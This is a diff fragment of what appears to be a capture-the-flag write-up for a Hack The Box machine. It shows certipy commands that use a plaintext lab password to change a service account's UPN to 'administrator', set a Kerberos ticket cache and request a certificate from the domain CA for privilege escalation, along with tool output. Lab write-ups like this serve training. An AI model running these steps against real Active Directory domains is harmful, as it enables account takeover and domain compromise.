@@ -685,3 +685,20 @@ We can see the UPN as ca_svc, now we can change it to Administrator.
 ```bash
 certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip 10.10.11.69 -upn 'administrator' -user 'ca_svc' update
 ```
+Output:
+```bash
+[*] Updating user 'ca_svc':
+    userPrincipalName                   : administrator
+[*] Successfully updated 'ca_svc'
+```
+Now from the [[#SCA]] where we got the Hash for ca_svc export it like this in your env var:
+```bash
+export KRB5CCNAME=ca_svc.ccache
+```
+Then request the certificate:
+```bash
+certipy req \
+    -k -dc-ip '10.10.11.69' \
+    -target 'DC01-fluffy.htb' -ca 'fluffy-DC01-CA' \
+    -template 'User'
+```
